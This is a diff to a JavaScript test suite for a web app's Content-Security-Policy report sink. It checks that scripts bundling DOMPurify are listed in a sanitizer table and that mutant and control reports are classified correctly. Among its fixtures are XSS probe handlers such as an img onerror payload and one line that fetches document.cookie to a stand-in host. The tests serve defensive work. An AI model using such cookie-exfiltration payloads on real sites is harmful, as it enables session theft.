@@ -25,6 +25,14 @@
 //   ③ the route: a fake report lands as ONE line; the duplicate is still one line + ONE notice; the same pair on another
 //      line is a second line and no second notice; a restart re-writes and re-notices nothing; a report from a FRAME the
 //      page made (document about / blob / data) is a line and NO notice (主开发's ruling 2) — the count tells them apart
+//   ③e EVERY SANITIZER THE APP SHIPS (lane csp-mermaid-sites): the diagram library bundles its OWN DOMPurify — every script
+//      the build serves built in memory (each esbuild step of package.json + scripts/build-novnc.mjs): a build that carries
+//      the dompurify package has exactly ONE parse site, one without has none, and app-csp PARSE_SCRIPTS = exactly the
+//      scripts with one (MUTANT: /mermaid.js cut from the table ⇒ RED by name, and the hostile diagram's report files the
+//      notice again); mermaid.js's site pinned on its symbol map; the test-chat-mermaid-chrome ⑦ label's report AT it ⇒ the
+//      sanitizer's line, no notice; the CONTROL — the same directive from mermaid.js at ANOTHER line ⇒ the app's line and
+//      its notice; another build / the bundle's stamp / the bundle's site named in mermaid.js (and the reverse) / no
+//      mermaid.js on disk ⇒ the notice — each script by its own `?v=` and its own sites
 //   ④ bounds: a 10 MB body ⇒ 413 and nothing lands; not a report type ⇒ 415; the 61st post a minute from one address ⇒ 429;
 //      (a repeat is never paced); past 1 MB the file rotates to .1; ≤ 10 new pairs a day file
 //   ⑤ the app page (server.js's index route, verbatim): the report-only header with the pinned directives; the ENFORCING
@@ -148,10 +156,10 @@ console.log('②b a script-src report\'s sample — kept only when asked for (a 
 
 // ── ③ THE ROUTE ──
 console.log('③ the route — one line per report key, one notice per pair');
-function hub({ dir, ...o } = {}) {
+function hub({ dir, sinkModule = SINK, ...o } = {}) {
   const added = [];
   const todos = { add: (key, it) => { added.push({ key, ...it }); return { id: 'ut-' + added.length }; } };
-  const sink = SINK.create({ dataDir: dir, getUserTodos: () => todos, log: { log() { }, warn() { } }, ...o });
+  const sink = sinkModule.create({ dataDir: dir, getUserTodos: () => todos, log: { log() { }, warn() { } }, ...o });
   const app = express(); sink.register(app); app.use(express.json());
   app.post('/after', (req, res) => res.json({ reached: true }));
   return new Promise((r) => { const srv = app.listen(0, '127.0.0.1', () => r({ sink, added, srv, port: srv.address().port, close: () => new Promise((c) => srv.close(c)) })); });
@@ -229,7 +237,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
   const allAt = (js, needle, skip = 0) => { const a = []; for (let i = js.indexOf(needle); i >= 0; i = js.indexOf(needle, i + 1)) a.push(i + skip); return a; };
   const builds = {};
   for (const [name, o] of [['release', rel], ['suites', { ...rel, minify: false }]]) {
-    const r = await esbuild.build({ ...o, entryPoints: [path.join(REPO, o.entryPoints[0])], outfile: path.join(REPO, o.outfile), absWorkingDir: REPO, sourcemap: 'external', sourcesContent: false, write: false, logLevel: 'silent' });
+    const r = await esbuild.build({ ...o, entryPoints: [path.join(REPO, o.entryPoints[0])], outfile: path.join(REPO, o.outfile), absWorkingDir: REPO, sourcemap: 'external', sourcesContent: false, metafile: true, write: false, logLevel: 'silent' });
     const js = Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.js')).contents).toString('utf8');
     const map = JSON.parse(Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.map')).contents).toString('utf8'));
     // EVERY parseFromString call in the bundle, by its text — and what the bundle's symbol map says each one is
@@ -244,7 +252,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     const writes = posOf(js, allAt(js, '.innerHTML', 1));
     const own = SYM.lookupMany(map, writes);
     const appWrite = writes.find(([l, c]) => { const p = own.get(`${l}:${c}`); return p && /src\/lib\/file-viewer\.js$/.test(p.source); });
-    builds[name] = { js, site: sites[0], appWrite };
+    builds[name] = { js, site: sites[0], appWrite, inputs: Object.keys(r.metafile.inputs) };
   }
   ok(builds.suites.site && builds.suites.site[1] === 35 && /^ +doc\d* = new DOMParser\d*\(\)\.$/.test(builds.suites.js.split('\n')[builds.suites.site[0] - 1].slice(0, 34)), 'the suites\' build spells the parse as Chrome 156 named it on the runner (bundle.js L:35 — measured 127564:35, the `parseFromString` of `doc = new DOMParser().parseFromString(…)`)', builds.suites.site);
   {
@@ -266,7 +274,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
   const CHAT = handler('fetch(\'//x.example/\'+document.cookie)', builds.suites.site); // an agent's markdown in the chat — the same one parse
   const CONTROL = handler('window.__pwned=14', builds.suites.appWrite);        // the SAME attribute set by OUR code (file-viewer's innerHTML)
   const [md] = C.reportsOf(JSON.stringify(MD), { site: true }), [ctl] = C.reportsOf(JSON.stringify(CONTROL), { site: true });
-  ok(md && md.site && md.site.v === V && md.site.line === builds.suites.site[0] && md.site.column === builds.suites.site[1] && !('sample' in md) && ctl && ctl.site, 'reportOf(…, { site: true }) keeps WHERE a candidate was set (the build, line, column — numbers) and still no sample', md);
+  ok(md && md.site && md.site.script === '/bundle.js' && md.site.v === V && md.site.line === builds.suites.site[0] && md.site.column === builds.suites.site[1] && !('sample' in md) && ctl && ctl.site, 'reportOf(…, { site: true }) keeps WHERE a candidate was set (the build, line, column — numbers) and still no sample', md);
   const siteless = [
     ['no sample (not a handler\'s code)', handler('', builds.suites.site)],
     ['another origin\'s bundle.js', handler('window.__pwned=14', builds.suites.site, { 'source-file': `http://evil.example/bundle.js?v=${V}` })],
@@ -285,7 +293,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
   const DH = path.join(ROOT, 'sanitizer', 'hub', 'data'); fs.mkdirSync(DH, { recursive: true });
   const FH = path.join(DH, SINK.FILE);
   {
-    const H = await hub({ dir: DH, bundle: BUNDLE });
+    const H = await hub({ dir: DH, publicDir: PUB });
     const a = await post(H, MD);
     const l1 = linesOf(FH);
     ok(a.status === 204 && l1.length === 1 && l1[0].kind === C.KIND_SANITIZER && !('site' in l1[0]) && !('sample' in l1[0]) && !fs.readFileSync(FH, 'utf8').includes('__pwned') && H.added.length === 0, 'the hostile .md\'s report (the sanitizer\'s parse) ⇒ ONE line of kind `sanitizer-parse` and NO For-you notice; the sample judged it and was never written', { l1, notices: H.added });
@@ -299,20 +307,20 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     const st = H.sink.stats();
     ok(st.sanitizer === 2 && H.sink.summary().app.lines === 1, 'stats: two reports judged the sanitizer\'s; the control counts on the app page', st);
     await H.close();
-    const H2 = await hub({ dir: DH, bundle: BUNDLE });
+    const H2 = await hub({ dir: DH, publicDir: PUB });
     const s2 = H2.sink.summary();
     ok(s2.sanitizer.lines === 1 && s2.app.lines === 1 && H2.added.length === 0, 'a RESTART reads each line\'s kind back: 1 sanitizer line, 1 app line', s2);
     await H2.close();
   }
   {
     const DB = path.join(ROOT, 'sanitizer', 'build', 'data'); fs.mkdirSync(DB, { recursive: true });
-    const H = await hub({ dir: DB, bundle: BUNDLE });
+    const H = await hub({ dir: DB, publicDir: PUB });
     await post(H, handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/bundle.js?v=1` }));
     const l = linesOf(path.join(DB, SINK.FILE));
     ok(l.length === 1 && !l[0].kind && H.added.length === 1 && H.sink.stats().otherBuild === 1, 'a page on ANOTHER build (its ?v= is not the bundle on disk) is not read — the report keeps its notice', { l, st: H.sink.stats() });
     await H.close();
     const DN = path.join(ROOT, 'sanitizer', 'nobundle', 'data'); fs.mkdirSync(DN, { recursive: true });
-    const HN = await hub({ dir: DN, bundle: path.join(ROOT, 'sanitizer', 'none.js') });
+    const HN = await hub({ dir: DN, publicDir: path.join(ROOT, 'sanitizer', 'none') });
     await post(HN, MD);
     ok(linesOf(path.join(DN, SINK.FILE)).length === 1 && HN.added.length === 1, 'no bundle on disk ⇒ the report is what it always was (a line + its notice)', HN.added);
     await HN.close();
@@ -320,7 +328,7 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
   {
     const DS = path.join(ROOT, 'sanitizer', 'suite', 'data'); fs.mkdirSync(DS, { recursive: true });
     const SF = path.join(ROOT, 'sanitizer', 'suite', 'csp-reports.jsonl');
-    const H = await hub({ dir: DS, file: SF, bundle: BUNDLE });
+    const H = await hub({ dir: DS, file: SF, publicDir: PUB });
     await post(H, MD);
     const l = linesOf(SF);
     ok(l.length === 1 && l[0].kind === C.KIND_SANITIZER && l[0].sample === 'window.__pwned=14' && H.added.length === 0, 'a chrome suite\'s file: the line keeps its sample AND its kind (the teardown prints it, never fails on it — ⑥c)', l);
@@ -331,12 +339,132 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
     fs.writeFileSync(BUNDLE, builds.release.js);
     const V2 = String(Math.floor(fs.statSync(BUNDLE).mtimeMs));
     const DR = path.join(ROOT, 'sanitizer', 'release', 'data'); fs.mkdirSync(DR, { recursive: true });
-    const H = await hub({ dir: DR, bundle: BUNDLE });
+    const H = await hub({ dir: DR, publicDir: PUB });
     await post(H, handler('window.__pwned=14', builds.release.site, { 'source-file': `${ORIGIN}/bundle.js?v=${V2}` }));
     await post(H, handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/bundle.js?v=${V2}` }));
     const l = linesOf(path.join(DR, SINK.FILE));
     ok(l.length === 2 && l[0].kind === C.KIND_SANITIZER && !l[1].kind && H.added.length === 1, `the release build (${builds.release.site.join(':')}): its own parse site is the sanitizer's; the suites' position on it is not (a notice)`, l);
     await H.close();
+  }
+
+  // ── ③e EVERY SANITIZER THE APP SHIPS (lane csp-mermaid-sites) ──
+  // The diagram library bundles its OWN DOMPurify (public/mermaid.js — src/lib/mermaid-render.js imports it lazily, stamped
+  // `?v=` like the bundle): on Chrome 156 test-chat-mermaid-chrome ⑦'s probe label «<img src=x onerror=window.__pwned=1>»
+  // was reported at mermaid.js 2:10038 (lane ci-mirror-hygiene, the runner) = purifyParseSites over the built file — and
+  // filed a For-you notice, because the judge read /bundle.js only. The table (app-csp PARSE_SCRIPTS) is pinned on EVERY
+  // script the build serves, each built here in memory — never a line:column written down (a rebuild moves it).
+  console.log('③e every script the app serves with a DOMPurify is in the judge\'s table (app-csp PARSE_SCRIPTS) — mermaid.js\'s own parse is the sanitizer\'s; its other lines, and another script\'s site, are the app\'s');
+  {
+    const steps = String(JSON.parse(readRepo('package.json')).scripts.build).split('&&').map((x) => x.trim());
+    /** an esbuild CLI step → API options; a flag the census does not know throws (a silent difference would read other bytes) */
+    const optsOf = (step) => {
+      const a = step.split(/\s+/), o = { entryPoints: [a[1]], loader: {} };
+      for (const f of a.slice(2)) {
+        if (f === '--bundle') o.bundle = true;
+        else if (f === '--minify') o.minify = true;
+        else if (/^--(outfile|format|platform|target)=/.test(f)) { const [k, v] = f.slice(2).split('='); o[k] = v; }
+        else if (f.startsWith('--loader:')) { const [ext, l] = f.slice('--loader:'.length).split('='); o.loader[ext] = l; }
+        else if (!f.startsWith('--log-level=')) throw new Error(`package.json build: an esbuild flag this census does not know: ${f}`);
+      }
+      return o;
+    };
+    const DOMPURIFY = /node_modules\/dompurify\//;
+    // every esbuild step at once (esbuild's own service builds them while the noVNC step below holds this thread)
+    const esSteps = steps.filter((x) => /^esbuild /.test(x)).map((step) => ({ step, o: optsOf(step) }));
+    const pending = esSteps.map(({ o }) => (o.entryPoints[0] === rel.entryPoints[0] ? null // the client: ③d's release build
+      : esbuild.build({ ...o, entryPoints: [path.join(REPO, o.entryPoints[0])], outfile: path.join(REPO, o.outfile), absWorkingDir: REPO, sourcemap: 'external', sourcesContent: false, metafile: true, write: false, logLevel: 'silent' })));
+    // the one served script no esbuild CLI step makes: noVNC (scripts/build-novnc.mjs — patched in its own esbuild call)
+    ok(steps.includes('node scripts/build-novnc.mjs'), 'the build\'s other served script is scripts/build-novnc.mjs (public/novnc.js)', steps);
+    const novncOut = path.join(ROOT, 'census', 'novnc.js'); fs.mkdirSync(path.dirname(novncOut), { recursive: true });
+    const nb = spawnSync(process.execPath, [path.join(REPO, 'scripts/build-novnc.mjs'), novncOut], { cwd: REPO, encoding: 'utf8' });
+    ok(nb.status === 0 && fs.existsSync(novncOut), 'scripts/build-novnc.mjs built public/novnc.js\'s bytes into the scratch dir', (nb.stderr || '').slice(0, 400));
+    const rows = []; // { served, dompurify (null: no metafile), sites, js, map }
+    for (const [i, { step, o }] of esSteps.entries()) {
+      ok(/^public\/[\w.-]+\.js$/.test(o.outfile || ''), `the build step ${o.entryPoints[0]} writes a served script (${o.outfile})`, step);
+      const served = '/' + String(o.outfile).slice('public/'.length);
+      if (!pending[i]) {
+        ok(JSON.stringify(SYM.flagsOf(o)) === JSON.stringify(SYM.flagsOf(rel)), 'the census reads the client step as ③d\'s release build', step);
+        rows.push({ served, dompurify: builds.release.inputs.some((k) => DOMPURIFY.test(k)), sites: C.purifyParseSites(builds.release.js), js: builds.release.js, map: null });
+        continue;
+      }
+      const r = await pending[i];
+      const js = Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.js')).contents).toString('utf8');
+      const map = JSON.parse(Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.map')).contents).toString('utf8'));
+      rows.push({ served, dompurify: Object.keys(r.metafile.inputs).some((k) => DOMPURIFY.test(k)), sites: C.purifyParseSites(js), js, map });
+    }
+    rows.push({ served: '/novnc.js', dompurify: null, sites: fs.existsSync(novncOut) ? C.purifyParseSites(fs.readFileSync(novncOut, 'utf8')) : [], js: '', map: null });
+    const carry = rows.filter((x) => x.sites.length).map((x) => x.served).sort();
+    const odd = rows.filter((x) => (x.dompurify === null ? x.sites.length !== 0 : x.sites.length !== (x.dompurify ? 1 : 0)));
+    ok(rows.length >= 5 && !odd.length, `every script the build serves, read: ${rows.map((x) => `${x.served} ${x.sites.length ? JSON.stringify(x.sites) : '—'}`).join(' · ')} — a build that carries the dompurify package has exactly ONE parse site, one without has none`, odd.map((x) => ({ served: x.served, dompurify: x.dompurify, sites: x.sites })));
+    /** what a table gets wrong against the census: a script with a parse site missing from it, a row with none */
+    const tableFails = (table) => [...carry.filter((x) => !table.includes(x)).map((x) => `${x} embeds a DOMPurify and is NOT in the table`), ...table.filter((x) => !carry.includes(x)).map((x) => `${x} is in the table and its build has no DOMPurify parse`)];
+    const TABLE = C.PARSE_SCRIPTS || [];
+    ok(Object.isFrozen(C.PARSE_SCRIPTS) && tableFails(TABLE).length === 0 && carry.includes('/bundle.js') && carry.includes('/mermaid.js'), `THE TABLE (app-csp PARSE_SCRIPTS ${JSON.stringify(C.PARSE_SCRIPTS)}) = the served scripts whose build carries a DOMPurify: ${carry.join(', ')}`, tableFails(TABLE));
+    // mermaid.js's site, pinned on ITS symbol map (as ③d pins the bundle's): every parseFromString call in it, named
+    const mer = rows.find((x) => x.served === '/mermaid.js');
+    const mCalls = posOf(mer.js, allAt(mer.js, '.parseFromString(', 1));
+    const mSaid = SYM.lookupMany(mer.map, mCalls);
+    const mIs = ([l, c]) => mSaid.get(`${l}:${c}`);
+    const mPurify = mCalls.filter((x) => mIs(x) && DOMPURIFY.test(mIs(x).source) && mIs(x).name === 'parseFromString');
+    ok(mPurify.length === 1 && JSON.stringify(mer.sites) === JSON.stringify(mPurify), `mermaid.js: its symbol map names DOMPurify's parse (${mPurify[0] && mIs(mPurify[0]) ? mIs(mPurify[0]).source.replace(/^(\.\.\/)+/, '').replace(/^.*node_modules\//, 'node_modules/') + ':' + mIs(mPurify[0]).line : '?'}) among its ${mCalls.length} parseFromString call(s), and purifyParseSites finds exactly it, at ${JSON.stringify(mer.sites)}`, { mCalls, mPurify, sites: mer.sites });
+
+    // THROUGH THE SINK: public/ holds the bundle (the release build, ③d's last step) and mermaid.js, each its own stamp
+    const MJS = path.join(PUB, 'mermaid.js');
+    fs.writeFileSync(MJS, mer.js);
+    const tB = fs.statSync(BUNDLE).mtime, tM = new Date(tB.getTime() - 3600e3);
+    fs.utimesSync(MJS, tM, tM); // an hour older than the bundle: the two `?v=` differ
+    const VB = String(Math.floor(fs.statSync(BUNDLE).mtimeMs)), VM = String(Math.floor(fs.statSync(MJS).mtimeMs));
+    const mSite = mer.sites[0], bSite = builds.release.site;
+    const from = (script, v) => ({ 'source-file': `${ORIGIN}${script}?v=${v}` });
+    const LABEL = 'window.__pwned=1'; // the handler of test-chat-mermaid-chrome ⑦'s probe label
+    // a handler mermaid's OWN code would set elsewhere: one of its innerHTML writes, on another line than the parse
+    const mOther = posOf(mer.js, allAt(mer.js, '.innerHTML', 1)).find(([l]) => l !== mSite[0]);
+    const PROBE = handler(LABEL, mSite, from('/mermaid.js', VM));
+    const [pr] = C.reportsOf(JSON.stringify(PROBE), { site: true });
+    ok(VB !== VM && mOther && pr && pr.site && pr.site.script === '/mermaid.js' && pr.site.v === VM && pr.site.line === mSite[0] && pr.site.column === mSite[1] && !('sample' in pr), 'reportOf(…, { site: true }) names WHICH script set it — /mermaid.js, its own ?v= (not the bundle\'s), line, column — and still no sample', { pr, VB, VM, mOther });
+    let n = 0;
+    const judge = async (body, o = {}) => {
+      const D = path.join(ROOT, 'mermaid', String(++n), 'data'); fs.mkdirSync(D, { recursive: true });
+      const H = await hub({ dir: D, publicDir: PUB, ...o });
+      const a = await post(H, body);
+      const out = { status: a.status, lines: linesOf(path.join(D, SINK.FILE)), notices: H.added.map((x) => x.text), stats: H.sink.stats(), summary: H.sink.summary() };
+      await H.close();
+      return out;
+    };
+    const SANITIZER = (j) => j.status === 204 && j.lines.length === 1 && j.lines[0].kind === C.KIND_SANITIZER && !j.lines[0].noticed && !j.notices.length && j.summary.sanitizer.lines === 1 && j.summary.app.lines === 0;
+    const APP = (j) => j.status === 204 && j.lines.length === 1 && !j.lines[0].kind && j.lines[0].noticed === true && j.notices.length === 1 && /would block script-src-attr: inline/.test(j.notices[0]) && j.summary.app.lines === 1 && j.summary.sanitizer.lines === 0;
+    const CASES = [
+      ['the hostile diagram label\'s report AT mermaid.js\'s own parse site ⇒ the SANITIZER\'s: one `sanitizer-parse` line, NO For-you notice, counted apart', PROBE, SANITIZER],
+      ['CONTROL — the same directive and handler from mermaid.js at ANOTHER line (one of its own innerHTML writes) ⇒ the app\'s: a line and its For-you notice', handler(LABEL, mOther, from('/mermaid.js', VM)), APP],
+      ['mermaid.js on ANOTHER build (its ?v= is not the file on disk) ⇒ not read: the notice', handler(LABEL, mSite, from('/mermaid.js', '1')), (j) => APP(j) && j.stats.otherBuild === 1],
+      ['mermaid.js stamped with the BUNDLE\'s ?v= ⇒ another build of mermaid.js (each script by its own stamp): the notice', handler(LABEL, mSite, from('/mermaid.js', VB)), (j) => APP(j) && j.stats.otherBuild === 1],
+      ['the bundle\'s parse site named in mermaid.js ⇒ not mermaid\'s (each script its own sites, never a union): the notice', handler(LABEL, bSite, from('/mermaid.js', VM)), APP],
+      ['mermaid.js\'s parse site named in the bundle ⇒ not the bundle\'s: the notice', handler(LABEL, mSite, from('/bundle.js', VB)), APP],
+      ['the bundle\'s own parse site beside mermaid.js on disk ⇒ still the sanitizer\'s', handler(LABEL, bSite, from('/bundle.js', VB)), SANITIZER],
+    ];
+    for (const [why, body, want] of CASES) { const j = await judge(body); ok(want(j), why, j); }
+    {
+      // no mermaid.js on disk (a public/ with the bundle only): its report keeps the notice, the bundle's is still judged
+      const P2 = path.join(ROOT, 'mermaid', 'bundle-only', 'public'); fs.mkdirSync(P2, { recursive: true });
+      fs.copyFileSync(BUNDLE, path.join(P2, 'bundle.js'));
+      const VB2 = String(Math.floor(fs.statSync(path.join(P2, 'bundle.js')).mtimeMs));
+      const a = await judge(PROBE, { publicDir: P2 }), b = await judge(handler(LABEL, bSite, from('/bundle.js', VB2)), { publicDir: P2 });
+      ok(APP(a) && SANITIZER(b), 'no mermaid.js on disk ⇒ its report is what it always was (a line + its notice); the bundle beside it is still judged', { a, b });
+    }
+    {
+      // THE PLANTED REMOVAL: /mermaid.js cut from the table ⇒ the census names it, and behind the REAL sink's code the
+      // hostile diagram's report files the For-you notice again
+      const src = readRepo('src/app-csp.js'), row = "const PARSE_SCRIPTS = Object.freeze(['/bundle.js', '/mermaid.js']);";
+      ok(src.split(row).length === 2, 'the mutant anchor (the table\'s one row) is in src/app-csp.js');
+      const MD = path.join(ROOT, 'mutant-table', 'src'); fs.mkdirSync(path.join(MD, 'server'), { recursive: true });
+      fs.writeFileSync(path.join(MD, 'app-csp.js'), src.replace(row, "const PARSE_SCRIPTS = Object.freeze(['/bundle.js']);"));
+      const M = require(path.join(MD, 'app-csp.js'));
+      const cut = tableFails(M.PARSE_SCRIPTS);
+      ok(cut.length === 1 && cut[0] === '/mermaid.js embeds a DOMPurify and is NOT in the table', `MUTANT (/mermaid.js cut from the table) ⇒ RED by name: «${cut.join('; ')}»`, cut);
+      const MS = load(path.join(MD, 'server', 'csp-reports.js'), readRepo('src/server/csp-reports.js')); // its require('../app-csp.js') = the mutant
+      const j = await judge(PROBE, { sinkModule: MS });
+      ok(APP(j), 'MUTANT (/mermaid.js cut from the table) ⇒ RED: behind the real sink\'s code the hostile diagram\'s report files a For-you notice again', j);
+    }
   }
 }
 
